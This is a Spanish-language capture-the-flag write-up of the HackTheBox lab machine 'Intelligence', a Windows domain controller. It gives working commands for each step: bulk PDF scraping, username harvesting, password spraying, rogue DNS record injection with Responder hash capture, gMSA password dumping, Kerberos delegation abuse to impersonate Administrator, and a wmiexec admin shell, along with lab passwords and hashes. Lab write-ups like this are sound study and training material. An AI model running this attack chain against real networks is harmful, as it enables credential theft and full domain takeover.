---
title: Intelligence Writeup
author: root3200
date: 2022-09-15
categories: [Writeup, HTB]
tags: [Windows, bloodhound, crackmapexec,]
image:
  path: ../../assets/img/intelligence/Intelligence.png
  width: 800 #normal 800
  height: 500 #normal 500
  alt: Intelligence
---

# Maquina Intelligence Windows 
Nos enfrentamos un AC que tiene un servicio web donde buscaremos informacion la cual obtendremos de manera masiva por medio de archivos .pdf, pero con ayuda de bash lograremos encontrar credenciales que nos permiten encontrar en recursos compartido un archivo powershell, crearemos un DNS records y con responder optener un hash NTLMv2 que romperemos con john y obtendremos nuevas credenciales, usaremos bloodhound para econtrar formas de ingresar al systema.


# Reconocimiento.
Con nmap ejecutamos el reconocimiento.

 ````bash
 >nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn -oG scan 10.10.10.248 scan
 
Ports: 
88/open/tcp//kerberos-sec///
389/open/tcp//ldap/// 
464/open/tcp//kpasswd5///
593/open/tcp//http-rpc-epmap///
636/open/tcp//ldapssl///, 3268/open/tcp//globalcatLDAP// 3269/open/tcp//globalcatLDAPssl//
5985/open/tcp//wsman/// 
49667/open/tcp// 
49706/open/tcp//
49713/open/tcp
````


Copiamos los puertos abiertos y ejecutamos con nmap 

````bash
>nmap -sCV -p88,389,464,593,636,3268,3269,5985,49667,49706,49713 -Pn -oN scanport 10.10.10.248

>PORT      STATE SERVICE      VERSION
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-09-10 03:01:48Z)
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-09-10T03:02:39+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2022-09-10T02:50:24
|_Not valid after:  2023-09-10T02:50:24
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2022-09-10T02:50:24
|_Not valid after:  2023-09-10T02:50:24
|_ssl-date: 2022-09-10T03:02:39+00:00; +7h00m01s from scanner time.
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-09-10T03:02:39+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2022-09-10T02:50:24
|_Not valid after:  2023-09-10T02:50:24
3269/tcp  open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-09-10T03:02:39+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2022-09-10T02:50:24
|_Not valid after:  2023-09-10T02:50:24
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49667/tcp open  msrpc        Microsoft Windows RPC
49706/tcp open  msrpc        Microsoft Windows RPC
49713/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
````

# Enumeracion 

## Puerto 80

Vamos al navegador con la url http://10.10.10.248

![imagen-de-prueba](/assets/img/intelligence/pagina-main.png)
_Intelligence_

En el inicio de la pagina no vemos mucha informacion, solo un `Documento de anuncio ` que nos da opcion de descarga 

![imagen-de-prueba](/assets/img/intelligence/pagina2.png)
_Intelligence_

Si le damos click a `Download` nos lleva a una ruta con un archivo `PDF` que tiene contenido en latin.

![imagen-de-prueba](/assets/img/intelligence/pagina-pdf.png)
_Intelligence_

En la url vemos un formato de yy/mm/dd si cambiamos los datos nos muestra mas archivos `PDF`

````bash
>http://10.10.10.248/documents/2022-01-02-upload.pdf
`````

Si por ejemplo cambiamos el 02 por 01 nos da otro .pdf

````bash
>http://10.10.10.248/documents/2022-01-01-upload.pdf
`````

Esto es interesante por que puede que en algun pdf obtengamos alguna credencial valida, pero no sabemos cuantas fechas existen en esta ruta `Documents` asi que en este punto puedo ir uno por uno pero podria perder mucho tiempo y no encontrar nada al final, con `bash` podemos hacer algun truco para enumerar todas las rutas que existen. 

# Bash script
Vamos hacer un script que nos permita buscar de manera mas rapida todas las rutas que tengan archivos PDF.

````bash
for i in {2020..2022}; do for j in {01..12}; do for k in {01..31}; do echo "http://10.10.10.248/documents/$i-$j-$k-upload.pdf"; done; done; done | xargs -n 1 wget
`````

Este script nos permite descargar con wget en un rango de 2020 a 2022 , mes 01 a mes 12, dia 01 a dia 31

![imagen-de-prueba](/assets/img/intelligence/descarga-pdf.png)
_Intelligence_

Ahora con todos los archivos lo primero que hacemos es mirar los metadatos usando exiftool que nos muestra mas informacion como fecha de creacion, modificacion, peso , formato, creador etc

````bash
>exiftool *.pdf
>exiftool *.pdf | grep 'Creator' # puedes hacer grep para ver solo el creador 
````

![imagen-de-prueba](/assets/img/intelligence/exiftool1.png)
_Intelligence_


Tenemos muchos usuarios, vamos a crear un archivo users.

````bash
> exiftool *.pdf | grep 'Creator' | awk 'NF{print $NF}' | sort -u > users
`````

![imagen-de-prueba](/assets/img/intelligence/exiftool2.png)
_Intelligence_

Bien ya tenemos los usuario, ahora tenemos que verificar que son existentes usaremos `kerbrute` que nos da la opcion de validar usuarios.

````bash
kerbrute userenum --dc 10.10.10.248 -d intelligence.htb users #users es donde guardamos la lista de usuarios
`````

![imagen-de-prueba](/assets/img/intelligence/kerbrute.png)
_Intelligence_

Perfecto tenemos 30 usuarios validos que existen en el DC, ahora lo que podemos hacer es intentar un `ASRepRoast Attack` con `GetNPUsers.py ` para solicitar `TGT` y ver si obtengo un hash NTLMv2.

 ````bash
 impacket-GetNPUsers.py intellingence.htb/ -no-pass -userfile users
`````

![imagen-de-prueba](/assets/img/intelligence/asrep.png)
_Intelligence_

El resultado es que ningun usuario es vulnerable al ataque, asi que solo tenemos usuarios pero sin contraseñas.

Todos los PDF que descargamos tiene contenido puede que en alguno exista alguna contraseña, leer el contenido por terminal es ilegible asi que usaremos `pdftotext` que nos comvierte el contenido del pdf en texto para poder velor en el terminal.

````bash
>for file in $(ls); do echo $file; done | while read filename; do pdftotext $filename; done 
`````

![imagen-de-prueba](/assets/img/intelligence/pdftotext.png)
_Intelligence_

Tenemos el texto de todos los pdf ahora con `cat` podemos mirar el contenido , pero si usamos `grep` para filtrar en todos los `.txt`  la palabra `password, users` puede que encontremos algo.

````bash
>cat *.txt | grep 'password' -2
`````

![imagen-de-prueba](/assets/img/intelligence/password1.png)
_Intelligence_

Tenemos una contraseña pero no sabemos de quien es, vamos a hacer un `Password Spray` con `crackmapexec` y averiguar si le corresponde a algun usuraio de nuestra lista `user` .

![imagen-de-prueba](/assets/img/intelligence/passwordspray.png)
_Intelligence_

La contraseña le pertenece a `Tiffany.Molina` pero cracmapexec me reporta que el usuario no es `pwned` , antes de seguir enumerando voy hacer un `Kerberoasting Attack` para ver si puedo obtener un `hash` .


![imagen-de-prueba](/assets/img/intelligence/kerberoasting.png)
_Intelligence_


El usuario no es vulnerable al `Kerberoasting` , lo que puedo hacer ahora que tengo credenciales validas es enumerar si la maquina tiene recursos compartidos con crackmapexec.

````bash
>cme smb 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --shares
`````

![imagen-de-prueba](/assets/img/intelligence/cme1.png)
_Intelligence_

Tenemos acceso a recursos compartidos con el usuario `Tiffany` , vemos que hay una directorio llamada `IT` miramos su contenido pero ahora usamos `smbmap` , dentro del directorio econtramos un archivo .ps1 

````bash
>smbmap -H 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -R 'IT'
`````

+ El modificador R es para listar todo el contenido del recurso IT.

![imagen-de-prueba](/assets/img/intelligence/smbmap.png)
_Intelligence_

Descargamos el archivo .ps1

````bash 
>smbmap -H 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --download 'IT/downdetector.ps1'
`````

Le hacemos un `cat` al .ps1 para ver su contenido.

![imagen-de-prueba](/assets/img/intelligence/ps1.png)
_Intelligence_

Es un script en powershell que ejecuta un tarea cada 5 minutos.

````bash
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
`````

Analizando el script vemos que  `$record` esta llamdo a los DNS records que existen pero se queda con los que tenga la palabra `web`  `Where-Object Name -like "web*"` , mas abajo se esta haciendo una peticion a la url `"http://$($record.Name)"` que con `.Name`  verifica si esxite la palabra `web` en la url, lo mas importante es que con `-UseDefaultCredentials` el script se autentica con las credenciales por defecto de alguien.

Teniendo toda la informacion del scrip vamos a tratar de inyectar un `dns record` para que el script se ejecute y por medio del `repodner` obtengamos un hash NTLMv2, para intentar roper con john o hashcat.

# Inyeccion DNS record 
Para esto necesitamos una herramienta `dnstool.py` con la que vamos hacer la  inyeccion.

````bash
>python3 dnstool.py -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -r webtest -a add -t A -d 10.10.14.16 10.10.10.248
`````

+ -r : nombre del dns 
+ -a : accion en este caso add para agregar 
+ -A : tipo pero lo dejamos en A por defecto
+ -d : la ip a donde apunta el dns que creamos 

Ahora con `responder` nos ponemos en escucha en la interfaz `Tun0` 

````bash
>reponder I tun0
`````

![imagen-de-prueba](/assets/img/intelligence/responder1.png)
_Intelligence_

El script dice que se ejecuta cada 5 minutos asi que esperemos y veamos si alguien se autentica al DNS que creamos.

````bash
[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:795ed731100fa3bf:EC36E05D2F850C3191B90CE10EFBD308:0101000000000000C9381448F792D7018BC129454A682E4000000000020008004B0054005000330001001E00570049004E002D0046005500450036004F00300059003800440049003200040014004B005400500033002E004C004F00430041004C0003003400570049004E002D0046005500450036004F003000590038004400490032002E004B005400500033002E004C004F00430041004C00050014004B005400500033002E004C004F00430041004C000800300030000000000000000000000000200000579BF3BE75B46EDA9826B9B1C8B2518795D25E61038C5C91F8A10A3DFB9AC4B70A0010000000000000000000000000000000000009003C0048005400540050002F007700650062002D0030007800640066002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
`````

El responder no da un hashs NTLMv2 de un usuario `Ted.Graves` , ahora tenemos que intentar romper el hashs y ver la contraseña en texto plano

![imagen-de-prueba](/assets/img/intelligence/hash1.png)
_Intelligence_

Tenemos una contraseña `Mr.Teddy` para el usuario `Ted.Graves` , validamos las credenciales con crackmapexec 

![imagen-de-prueba](/assets/img/intelligence/cme2.png)
_Intelligence_

La cuenta es valida pero no es `pwned` , en este punto tenemos dos credenciales validas pero no tenemos acceso a la maquina asi que vamos enumerar y recolectar mas informacion para ver si encontramos alguna forma de acceder.

Iniciamos la busqueda de informacion con `Bloodhound-python` usando las credenciales que tenemos.

````bash
>bloodhound-python -c ALL -u 'Ted.Graves' -p 'Mr.Teddy' -ns 10.10.10.248 -d intelligence.htb
`````

![imagen-de-prueba](/assets/img/intelligence/bloodhoundpy.png)
_Intelligence_

Ahora vamos a utilizar bloodhound, despues cargamos los archivos `.json` para analizarlos.

![imagen-de-prueba](/assets/img/intelligence/json1.png)
_Intelligence_

![imagen-de-prueba](/assets/img/intelligence/json2.png)
_Intelligence_

Vemo que el usuario `Ted.Graves` tiene la capcidad de dumpear la contraseña del `service account` `SVC_INTELLIGENCE.HTB` 

![imagen-de-prueba](/assets/img/intelligence/dump1.png)
_Intelligence_

Para dumpear la GMSA password usamos `gMSADumper.py` la cual solo nos pide el usuario la contraseña y el dominio.

````bash
>python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -l 10.10.10.248 -d intelligence.htb 
`````

![imagen-de-prueba](/assets/img/intelligence/gmsadumper1.png)
_Intelligence_

Tenemos el hashs del `service account` con esto lo que podemos hacer es impersonar al usuario Administrador.

````bash
>mpacket-getST -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int -hashes :4b18bc2b883607c026d27bf526bcb3d4
`````

![imagen-de-prueba](/assets/img/intelligence/getst1.png)
_Intelligence_

Tenemos un error `clock skew too great` esto pasa por que nuestra maquina tiene que estar sincronizada con la maquina victima, se soluciona con `ntpdate`

````bash
>ntpdate 10.10.10.248
`````

Si utilizamos `virtual-box` seguiremos teniendo el mismo error al ejecutar `getST` para solucionarlo hay que desactivar las virtual-box-utils.

````bash
>sudo service virtualbox-guest-utils stop
`````

Ejecutamos de nuevo `mpacket-getST`

![imagen-de-prueba](/assets/img/intelligence/getst2.png)
_Intelligence_

Creamos el Administrator.cache ahora tenemos que exportarlo.

````bash
export KRB5CCNAME=Administrator.ccache
`````

Vamos a usar `wmiexec.py` 

````bash
>impacket-wmiexec dc.intelligence.htb -k -no-pass
`````

![imagen-de-prueba](/assets/img/intelligence/adminshell.png)
_Intelligence_

Con esto tenemos acceso como Administrador al sistema.

